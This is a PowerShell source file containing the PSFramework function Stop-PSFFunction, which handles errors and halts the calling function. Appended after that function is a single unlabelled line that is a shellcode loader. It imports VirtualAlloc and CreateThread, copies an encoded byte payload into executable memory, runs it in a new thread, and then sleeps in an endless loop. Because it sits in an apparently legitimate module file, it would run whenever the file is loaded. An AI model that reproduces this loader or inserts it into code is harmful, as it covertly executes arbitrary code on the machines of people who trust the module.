function Stop-PSFFunction
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
	[CmdletBinding(DefaultParameterSetName = 'Message', HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Stop-PSFFunction')]
	param (
		[Parameter(Mandatory = $true, ParameterSetName = 'Message')]
		[string]
		$Message,
		
		[Parameter(Mandatory = $true, ParameterSetName = 'String')]
		[string]
		$String,
		
		[Parameter(ParameterSetName = 'String')]
		[object[]]
		$StringValues,
		
		[bool]
		$EnableException,
		
		[System.Management.Automation.ErrorCategory]
		$Category = ([System.Management.Automation.ErrorCategory]::NotSpecified),
		
		[Alias('InnerErrorRecord')]
		[System.Management.Automation.ErrorRecord[]]
		$ErrorRecord,
		
		[string[]]
		$Tag,
		
		[string]
		$FunctionName,
		
		[string]
		$ModuleName,
		
		[string]
		$File,
		
		[int]
		$Line,
		
		[System.Exception]
		$Exception,
		
		[switch]
		$OverrideExceptionMessage,
		
		[object]
		$Target,
		
		[switch]
		$Continue,
		
		[switch]
		$SilentlyContinue,
		
		[string]
		$ContinueLabel,
		
		[System.Management.Automation.PSCmdlet]
		$Cmdlet,
		
		[int]
		$StepsUpward = 0
	)
	
	if ($Cmdlet) { $myCmdlet = $Cmdlet }
	else { $myCmdlet = $PSCmdlet }
	
	
	$callStack = (Get-PSCallStack)[1]
	if (-not $FunctionName) { $FunctionName = $callStack.Command }
	if (-not $FunctionName) { $FunctionName = "<Unknown>" }
	if (-not $ModuleName) { $ModuleName = $callstack.InvocationInfo.MyCommand.ModuleName }
	if (-not $ModuleName) { $ModuleName = "<Unknown>" }
	if (-not $File) { $File = $callStack.Position.File }
	if (-not $Line) { $Line = $callStack.Position.StartLineNumber }
	if ((Test-PSFParameterBinding -ParameterName EnableException -Not) -and (Test-PSFFeature -Name "PSFramework.InheritEnableException" -ModuleName $ModuleName))
	{
		$EnableException = [bool]$PSCmdlet.GetVariableValue('EnableException')
	}
	
	
	
	
	if ($null -ne $Target)
	{
		$Target = Convert-PsfMessageTarget -Target $Target -FunctionName $FunctionName -ModuleName $ModuleName
	}
	
	
	
	if ($Exception)
	{
		$Exception = Convert-PsfMessageException -Exception $Exception -FunctionName $FunctionName -ModuleName $ModuleName
	}
	elseif ($ErrorRecord)
	{
		$int = 0
		while ($int -lt $ErrorRecord.Length)
		{
			$tempException = Convert-PsfMessageException -Exception $ErrorRecord[$int].Exception -FunctionName $FunctionName -ModuleName $ModuleName
			if ($tempException -ne $ErrorRecord[$int].Exception)
			{
				$ErrorRecord[$int] = New-Object System.Management.Automation.ErrorRecord($tempException, $ErrorRecord[$int].FullyQualifiedErrorId, $ErrorRecord[$int].CategoryInfo.Category, $ErrorRecord[$int].TargetObject)
			}
			
			$int++
		}
	}
	
	
	
	
	$records = @()
	
	$paramWritePSFMessage = @{
		Level				     = 'Warning'
		EnableException		     = $EnableException
		FunctionName			 = $FunctionName
		Target				     = $Target
		Tag					     = $Tag
		ModuleName			     = $ModuleName
		File					 = $File
		Line					 = $Line
	}
	if ($OverrideExceptionMessage) { $paramWritePSFMessage['OverrideExceptionMessage'] = $true }
	if ($Message) { $paramWritePSFMessage["Message"] = $Message }
	else
	{
		$paramWritePSFMessage["String"] = $String
		$paramWritePSFMessage["StringValues"] = $StringValues
	}
	
	if ($ErrorRecord -or $Exception)
	{
		if ($ErrorRecord)
		{
			foreach ($record in $ErrorRecord)
			{
				if (-not $Exception) { $newException = New-Object System.Exception($record.Exception.Message, $record.Exception) }
				else { $newException = $Exception }
				if ($record.CategoryInfo.Category) { $Category = $record.CategoryInfo.Category }
				$records += New-Object System.Management.Automation.ErrorRecord($newException, "$($ModuleName)_$FunctionName", $Category, $Target)
			}
		}
		else
		{
			$records += New-Object System.Management.Automation.ErrorRecord($Exception, "$($ModuleName)_$FunctionName", $Category, $Target)
		}
		
		
		if ($EnableException) { Write-PSFMessage -ErrorRecord $records @paramWritePSFMessage 3>$null }
		else { Write-PSFMessage -ErrorRecord $records @paramWritePSFMessage }
	}
	else
	{
		$exception = New-Object System.Exception($Message)
		$records += New-Object System.Management.Automation.ErrorRecord($Exception, "$($ModuleName)_$FunctionName", $Category, $Target)
		
		
		if ($EnableException) { Write-PSFMessage -ErrorRecord $records @paramWritePSFMessage 3>$null }
		else { Write-PSFMessage -ErrorRecord $records @paramWritePSFMessage }
	}
	
	
	
	if ($EnableException)
	{
		if ($SilentlyContinue)
		{
			foreach ($record in $records) { $myCmdlet.WriteError($record) }
			if ($ContinueLabel) { continue $ContinueLabel }
			else { continue }
		}
		
		
		$psframework_killqueue.Enqueue($callStack.InvocationInfo.GetHashCode())
		
		
		if (-not $Cmdlet) { throw $records[0] }
		else { $Cmdlet.ThrowTerminatingError($records[0]) }
	}
	
	
	
	else
	{
		
		foreach ($record in $records)
		{
			$null = Write-Error -Message $record -Category $Category -TargetObject $Target -Exception $record.Exception -ErrorId "$($ModuleName)_$FunctionName" -ErrorAction Continue 2>&1
		}
		
		if ($Continue)
		{
			if ($ContinueLabel) { continue $ContinueLabel }
			else { continue }
		}
		else
		{
			
			if ($StepsUpward -eq 0) { $psframework_killqueue.Enqueue($callStack.InvocationInfo.GetHashCode()) }
			elseif ($StepsUpward -gt 0) { $psframework_killqueue.Enqueue((Get-PSCallStack)[($StepsUpward + 1)].InvocationInfo.GetHashCode()) }
			return
		}
	}
	
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xb8,0x55,0x17,0x46,0xdc,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x18,0x83,0xed,0xfc,0x03,0x45,0x41,0xf5,0xb3,0x20,0x81,0x7b,0x3b,0xd9,0x51,0x1c,0xb5,0x3c,0x60,0x1c,0xa1,0x35,0xd2,0xac,0xa1,0x18,0xde,0x47,0xe7,0x88,0x55,0x25,0x20,0xbe,0xde,0x80,0x16,0xf1,0xdf,0xb9,0x6b,0x90,0x63,0xc0,0xbf,0x72,0x5a,0x0b,0xb2,0x73,0x9b,0x76,0x3f,0x21,0x74,0xfc,0x92,0xd6,0xf1,0x48,0x2f,0x5c,0x49,0x5c,0x37,0x81,0x19,0x5f,0x16,0x14,0x12,0x06,0xb8,0x96,0xf7,0x32,0xf1,0x80,0x14,0x7e,0x4b,0x3a,0xee,0xf4,0x4a,0xea,0x3f,0xf4,0xe1,0xd3,0xf0,0x07,0xfb,0x14,0x36,0xf8,0x8e,0x6c,0x45,0x85,0x88,0xaa,0x34,0x51,0x1c,0x29,0x9e,0x12,0x86,0x95,0x1f,0xf6,0x51,0x5d,0x13,0xb3,0x16,0x39,0x37,0x42,0xfa,0x31,0x43,0xcf,0xfd,0x95,0xc2,0x8b,0xd9,0x31,0x8f,0x48,0x43,0x63,0x75,0x3e,0x7c,0x73,0xd6,0x9f,0xd8,0xff,0xfa,0xf4,0x50,0xa2,0x92,0x39,0x59,0x5d,0x62,0x56,0xea,0x2e,0x50,0xf9,0x40,0xb9,0xd8,0x72,0x4f,0x3e,0x1f,0xa9,0x37,0xd0,0xde,0x52,0x48,0xf8,0x24,0x06,0x18,0x92,0x8d,0x27,0xf3,0x62,0x32,0xf2,0x54,0x33,0x9c,0xad,0x14,0xe3,0x5c,0x1e,0xfd,0xe9,0x53,0x41,0x1d,0x12,0xbe,0xea,0xb4,0xe8,0x28,0x46,0xb5,0x7f,0xde,0x00,0x47,0x80,0x0f,0x8d,0xce,0x66,0x45,0x3d,0x87,0x31,0xf1,0xa4,0x82,0xca,0x60,0x28,0x19,0xb7,0xa2,0xa2,0xae,0x47,0x6c,0x43,0xda,0x5b,0x18,0xa3,0x91,0x06,0x8e,0xbc,0x0f,0x2c,0x2e,0x29,0xb4,0xe7,0x79,0xc5,0xb6,0xde,0x4d,0x4a,0x48,0x35,0xc6,0x43,0xdc,0xf6,0xb0,0xab,0x30,0xf7,0x40,0xfa,0x5a,0xf7,0x28,0x5a,0x3f,0xa4,0x4d,0xa5,0xea,0xd8,0xde,0x30,0x15,0x89,0xb3,0x93,0x7d,0x37,0xea,0xd4,0x21,0xc8,0xd9,0xe4,0x1e,0x1f,0x27,0x93,0x4e,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

